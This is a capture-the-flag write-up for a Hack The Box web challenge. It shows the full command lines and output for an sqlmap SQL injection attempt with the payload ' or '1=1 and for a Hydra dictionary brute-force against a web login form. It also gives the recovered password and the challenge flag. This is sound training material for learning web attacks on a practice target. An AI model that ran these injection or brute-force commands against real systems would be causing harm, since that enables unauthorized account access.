# WEB CHALLENGE: LERNAEAN

## Challenge Description
Your target is not very good with computers. Try and guess their password to
see if they may be hiding anything!

```
host: 88.198.233.174 port:33971
```

## SQLMAP
Let's try SQLMAP to see if SQL injection might work (turns out it doesn't)..

```
$ sqlmap -u http://88.198.233.174:33971/ --data="password=' or '1=1" --tamper=space2comment
```
## BURPSUITE
Let's see if we can examine the HTTP traffic between us and the server by using
burpsuite as our browser proxy to understand what is being passed around..

```
<REQUEST>
POST / HTTP/1.1
Host: 88.198.233.174:33971
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://88.198.233.174:33971/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

password=test
</REQUEST>

<RESPONSE>
HTTP/1.1 200 OK
Date: Thu, 30 Nov 2017 18:32:43 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 474
Connection: close
Content-Type: text/html; charset=UTF-8

Invalid password!
</RESPONSE>
```

Okay.. that tells us that `password` is the variable being passed to the server.

## WIRESHARK
Let's use wireshark just to confirm what is happening..

```
$ sudo wireshark -i eth0 -k
```

```
SOURCE: 10.0.2.15 DESTINATION: 88.198.233.174 PROTOCOL: HTTP INFO: POST / HTTP1.1 (application/x-www-form-urlencoded)

HTML Form URL Encoded: application/x-www-form-urlencoded
  Form item: "password" = "test"
    Key: password
    Value: test
```

## HYDRA
Okay.. now let's try using `hydra` to mimic these requests and brute force our
way through a dictionary attack..

```
$ hydra 88.198.233.174 -s 33971 http-form-post "/:user=^USER^&password=^PASS^:Invalid password!" -l user -P /usr/share/wordlists/rockyou.txt
```

```
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-11-30 17:13:03
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://88.198.233.174:33971//:user=^USER^&password=^PASS^:Invalid password!
[33971][http-post-form] host: 88.198.233.174   login: user   password: leonardo
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-11-30 17:13:41
```

Weeeeeeee! Looks like we found a valid password.

## LOOKING FOR THE FLAG
Trying the password we found on the form gives us a `Ooops! Too slow` response
on this page: `http://88.198.233.174:33971/noooooooope.html`..

.. but if we sue burpsuite to analyze the response from the server, we find
some hidden info..

```
<RESPONSE>
HTTP/1.1 200 OK
Date: Thu, 30 Nov 2017 22:17:03 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 618
Connection: close
Content-Type: text/html; charset=UTF-8

<h1 style='color: #fff;'>HTB{l1k3_4_b0s5_s0n}</h1><script type="text/javascript">
                   window.location = "noooooooope.html"
              </script>
</RESPONSE>
```
